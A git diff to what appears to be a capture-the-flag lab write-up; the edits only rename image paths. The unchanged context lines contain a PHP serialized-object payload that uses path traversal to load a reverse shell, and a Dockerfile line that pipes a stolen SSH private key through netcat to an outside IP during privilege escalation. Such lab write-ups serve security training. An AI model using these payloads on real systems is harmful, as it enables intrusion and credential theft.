@@ -212,7 +212,7 @@ O:4:"Page":1:{s:4:"file";s:48:"../../../../../../../srv/ftp/phpreverseshell.php"
 
 I had to put the file there again since something cleared it, but I did get a reverse shell in the end:
 
-<figure><img src="../../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (22) (3).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -267,7 +267,7 @@ RUN cat /tmp/id_rsa.bak | nc 192.168.45.196 21
 
 Then, we can run `sudo /usr/bin/docker build .` within `/opt` where the `Dockerfile` is.&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (45) (8).png" alt=""><figcaption></figcaption></figure>
 
 We can then `ssh` in as `root`:
 
